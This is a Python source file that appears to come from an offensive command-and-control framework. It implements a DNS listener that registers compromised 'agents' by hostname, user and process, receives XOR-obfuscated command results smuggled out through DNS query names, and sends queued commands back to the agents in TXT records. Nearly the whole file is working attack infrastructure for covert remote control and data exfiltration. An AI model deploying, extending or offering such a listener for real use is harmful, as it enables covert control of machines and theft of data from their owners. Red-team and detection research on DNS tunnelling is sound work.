# teamserver/listener/dns_listener.py
# Provides a DNS-based listener to receive and process C2 traffic 
# via DNS queries for the Teamserver.

# WARNING : This is a limited basic listener !

import threading
import base64
import time
import socket
from dnslib import DNSRecord, QTYPE, RR, A, TXT
from .base_listener import BaseListener
from teamserver.encryption.xor_util import XORCipher
from teamserver.logger.CustomLogger import CustomLogger
log = CustomLogger("volchock")

class DnsListener(BaseListener):
    def __init__(self, config, host='0.0.0.0', port=53, request_queue=None, agent_handler=None, xor_key=None):
        super().__init__(config)
        self.host = host
        self.port = port
        self.request_queue = request_queue
        self.agent_handler = agent_handler
        if xor_key is None:
            log.critical("[!] xor_key must be provided to DnsListener")
            raise ValueError("xor_key must be provided to DnsListener")
        self.xor_cipher = XORCipher(xor_key)
        self._running = threading.Event()
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        log.info(f"[+] Starting DNS listener {self.config.get('name', 'dns_listener')} on {self.host}:{self.port}")
        self._running.set()
        self.thread.start()

    def _run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.port))
        log.info(f"[+] DNS Listener {self.config.get('name', 'dns_listener')} started on port {self.port}.")
        while self._running.is_set():
            try:
                data, addr = sock.recvfrom(512)
                threading.Thread(target=self.handle_request, args=(sock, data, addr), daemon=True).start()
            except Exception as e:
                log.critical(f"[!] DNS listener error: {e}")
        sock.close()
        log.info(f"[*] DNS Listener {self.config.get('name', 'dns_listener')} stopped.")

    def handle_request(self, sock, data, addr):
        now = time.time()
        try:
            req = DNSRecord.parse(data)
            qname = str(req.q.qname)
            qtype = QTYPE[req.q.qtype]
            parts = qname.split('.')
            op = parts[0]
            agent_b64 = parts[1]
            try:
                agent_id = base64.b64decode(agent_b64.encode()).decode(errors='replace')
            except Exception as e:
                agent_id = "<invalid-b64>"
            retrieve_agentid = agent_id.split("_", 2)  # /!\ bien mettre maxsplit=2 en cas de "_" dans username ou process
            if len(retrieve_agentid) == 3:
                hostname, username, process_name = retrieve_agentid
            else:
                hostname, username, process_name = agent_id, "", ""
            agent_fields = {"last_seen": now, "hostname": hostname, "ip": addr[0], "process_name": process_name, "username": username}
            if not self.agent_handler.get_agent(agent_id):
                self.agent_handler.register_agent(agent_id, agent_fields)
            else:
                self.agent_handler.update_agent(agent_id, agent_fields)
            entry = {
                "qname": qname,
                "qtype": qtype,
                "addr": addr,
                "time": now,
                "raw_request": data.hex()
            }
            if self.request_queue is not None:
                self.request_queue.put(entry)
            if op == "result" and len(parts) >= 4:
                result_b64 = parts[2]
                try:
                    result = self.xor_cipher.decrypt_b64(result_b64)
                    self.agent_handler.push_agent_result(agent_id, result)
                except Exception as e:
                    log.error("[TEAMSERVER][ERROR] Can't decode result:", e)
                reply = req.reply()
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("OK"), ttl=30))
                sock.sendto(reply.pack(), addr)
                return
            qt = QTYPE.reverse.get(req.q.qtype, QTYPE.A)
            reply = req.reply()
            cmds = self.agent_handler.pop_commands(agent_id)
            if cmds:
                cmd_enc = self.xor_cipher.encrypt_b64(cmds[0])
                answer_txt = ".".join([cmd_enc[i:i+63] for i in range(0, len(cmd_enc), 63)])
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer_txt), ttl=30)) 
            else:
                reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=30))
            sock.sendto(reply.pack(), addr)
        except Exception as e:
            log.error(f"[!] DNS request parse error from {addr}: {e}")

    def stop(self):
        log.info(f"[+] Stopping DNS listener {self.config.get('name', 'dns_listener')}")
        self._running.clear()

    def join(self):
        while self.thread.is_alive():
            time.sleep(1)